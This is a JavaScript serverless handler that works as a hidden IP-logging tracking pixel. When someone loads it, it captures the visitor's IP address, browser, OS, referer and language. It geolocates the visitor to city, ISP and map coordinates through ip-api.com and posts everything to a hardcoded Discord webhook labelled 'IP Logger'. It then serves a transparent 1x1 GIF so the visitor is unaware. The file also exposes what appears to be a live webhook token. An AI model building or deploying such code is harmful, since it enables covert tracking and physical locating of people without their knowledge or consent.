export default async function handler(req, res) {
    const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1515786524808184010/MCuQTf8_VZ0XJQq6QCBjbde_eN0aPWMOhzE-uHY1csVJ_h96LBOzHhxXIVIr5jDuVD-v"; // Replace with your actual webhook
    
    if (req.method === 'GET') {
        const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'unknown';
        const userAgent = req.headers['user-agent'] || 'unknown';
        const referer = req.headers['referer'] || 'direct';
        const acceptLang = req.headers['accept-language'] || '';
        
        // Geo location via ip-api.com
        let geo = {};
        try {
            const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,region,lat,lon,isp,org,mobile,proxy,hosting`);
            geo = await geoRes.json();
        } catch(e) {
            geo = { status: 'fail' };
        }
        
        // Parse user agent
        const ua = userAgent.toLowerCase();
        let os = 'unknown', browser = 'unknown', isWebKit = false;
        
        if (ua.includes('iphone') || ua.includes('ipad')) os = 'iOS';
        else if (ua.includes('android')) os = 'Android';
        else if (ua.includes('windows nt 10.0')) os = 'Windows 10';
        else if (ua.includes('windows nt 11.0')) os = 'Windows 11';
        else if (ua.includes('mac os x')) os = 'macOS';
        else if (ua.includes('linux')) os = 'Linux';
        
        if (ua.includes('chrome') && !ua.includes('edg')) browser = 'Chrome';
        else if (ua.includes('firefox')) browser = 'Firefox';
        else if (ua.includes('safari') && !ua.includes('chrome')) browser = 'Safari';
        else if (ua.includes('edg')) browser = 'Edge';
        
        isWebKit = ua.includes('webkit');
        
        // Cyan colored embed
        const embed = {
            title: "🎯 NEW HIT",
            color: 0x00ffff,
            timestamp: new Date().toISOString(),
            fields: [
                { name: "🌐 IP", value: ip, inline: true },
                { name: "📍 Country", value: geo.status === 'success' ? geo.country : '?', inline: true },
                { name: "🏙️ City", value: geo.status === 'success' ? geo.city : '?', inline: true },
                { name: "📡 ISP", value: geo.status === 'success' ? geo.isp : '?', inline: true },
                { name: "📱 Mobile", value: (geo.status === 'success' && geo.mobile) ? "Yes" : "No", inline: true },
                { name: "🖥️ Proxy/VPN", value: (geo.status === 'success' && geo.proxy) ? "Yes" : "No", inline: true },
                { name: "💻 OS", value: os, inline: true },
                { name: "🌍 Browser", value: browser, inline: true },
                { name: "🍎 WebKit", value: isWebKit ? "Yes" : "No", inline: true },
                { name: "🔗 Referer", value: referer.length > 80 ? referer.substring(0,80)+'...' : referer, inline: false },
                { name: "🌐 Language", value: acceptLang || 'unknown', inline: true }
            ]
        };
        
        // Add coordinates if available
        if (geo.status === 'success' && geo.lat && geo.lon) {
            embed.fields.push(
                { name: "🗺️ Coordinates", value: `${geo.lat}, ${geo.lon}`, inline: true },
                { name: "🗺️ Google Maps", value: `https://maps.google.com/?q=${geo.lat},${geo.lon}`, inline: true }
            );
        }
        
        // Send to Discord
        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds: [embed], username: "IP Logger" })
            });
        } catch(e) {}
        
        // Return 1x1 transparent GIF
        const gifBuffer = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
        res.setHeader('Content-Type', 'image/gif');
        res.status(200).send(gifBuffer);
    } else {
        res.status(405).send('Method Not Allowed');
    }
}
